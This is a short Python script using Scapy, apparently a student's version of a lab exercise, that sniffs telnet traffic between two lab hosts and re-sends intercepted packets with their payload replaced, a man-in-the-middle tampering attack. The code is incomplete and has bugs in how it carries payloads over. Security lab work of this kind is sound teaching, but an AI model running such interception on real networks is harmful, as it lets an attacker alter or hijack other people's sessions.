#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

oldPayload = b''  # Initialize oldPayload as a bytes object

def spoof_pkt(pkt):
    oldPayload= ''
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B and pkt[TCP].dport == 23:
        print("this is A src")
        pkt.show()
        # Create a new packet based on the captured one.
        # 1) We need to delete the checksum in the IP & TCP headers,
        # because our modification will make them invalid.
        # Scapy will recalculate them if these fields are missing.
        # 2) We also delete the original TCP payload.
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        #################################################################
        # Construct the new payload based on the old payload.
        # Students need to implement this part.
        if pkt[TCP].payload:
            oldPayload = pkt[TCP].payload
            data = 'z'  # The original payload data
            newdata = data  # No change is made in this sample code
            send(newpkt/newdata)
        else:
            send(newpkt)
        #################################################################
    
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A and pkt[TCP].sport == 23:
        # Create a new packet based on the captured one
        # Do not make any change
        print("this is B src")
        pkt.show()
        newpkt = IP(bytes(pkt[IP]))
        newpkt[TCP].payload = oldPayload
        del(newpkt.chksum)  
        del(newpkt[TCP].chksum)
        send(newpkt)
        # try and see the difference and if payload is working or change it to Raw.load
        

f = 'tcp'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
